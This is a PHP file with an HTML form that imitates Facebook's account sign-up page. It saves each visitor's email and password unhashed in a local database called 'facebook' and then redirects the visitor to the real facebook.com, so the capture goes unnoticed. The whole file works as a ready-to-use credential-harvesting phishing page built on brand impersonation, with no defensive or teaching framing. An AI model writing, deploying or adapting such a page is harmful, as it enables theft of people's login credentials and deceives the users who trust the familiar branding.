<?php
// create_account.php

// Database connection settings
$host = 'localhost'; // Change to your database host
$dbname = 'facebook'; // Change to your database name
$username = 'root'; // Change to your database username
$password = ''; // Change to your database password

// Create a connection to the database
try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    // Set the PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

// Handle form submission
$error = ''; // Initialize the error variable
$success = ''; // Initialize the success variable

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Check if the email already exists
    $stmt = $conn->prepare("SELECT * FROM Users WHERE email = :email");
    $stmt->execute(['email' => $email]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user) {
        // User already exists
        $error = "Email already registered.";
    } else {
        // Prepare a query to insert new user without hashing the password
        $stmt = $conn->prepare("INSERT INTO Users (email, password) VALUES (:email, :password)");
        $stmt->execute([
            'email' => $email,
            'password' => $password // Store the password in plain text
        ]);
        $success = "Account created successfully! Redirecting to Facebook...";

        // Redirect to Facebook after successful registration
        header("Location: https://www.facebook.com");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Account</title>
    <style>
    body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
.container {
    display: flex;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
    overflow: hidden;
    width: 600px;
}
.left {
    padding: 40px;
    flex: 1;
    text-align: center;
}
.left h1 {
    color: #007bff; /* Changed only the h1 element color to blue */
    font-size: 36px;
    margin-bottom: 20px;
}
.left p {
    font-size: 18px;
    color: black; /* Ensure other texts remain black */
}
.right {
    padding: 40px;
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
}
.right h2 {
    font-size: 24px;
    margin-bottom: 20px;
    color: #1c1e21;
}
.input-group {
    margin-bottom: 15px;
    width: 100%;
}
.input-group input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
    font-size: 14px;
    background-color: #f5f6f7;
    transition: border-color 0.3s;
}
.input-group input:focus {
    border-color: #1877f2;
    outline: none;
}
.register-button {
    width: 100%;
    padding: 12px;
    background-color: green; /* Changed button background color to green */
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
}
.register-button:hover {
    background-color: #165eab; /* Optional: Adjust hover color if needed */
}
.footer {
    margin-top: 15px;
    font-size: 14px;
    color: #777;
    text-align: center;
}
.footer a {
    color: #1877f2;
    text-decoration: none;
}
.footer a:hover {
    text-decoration: underline;
}

    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right">
            <h2>Create a new account</h2>
            <form method="POST" action="">
                <div class="input-group">
                    <input type="email" name="email" placeholder="Email or Phone Number" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="register-button">Sign Up</button>
                <hr>
                <div class="footer">
                    <p>Already have an account? <a href="login.php">Log In</a></p>
                </div>
            </form>
            <?php if (!empty($error)): ?>
                <p style="color: red;"><?php echo htmlspecialchars($error); ?></p>
            <?php elseif (!empty($success)): ?>
                <p style="color: green;"><?php echo htmlspecialchars($success); ?></p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
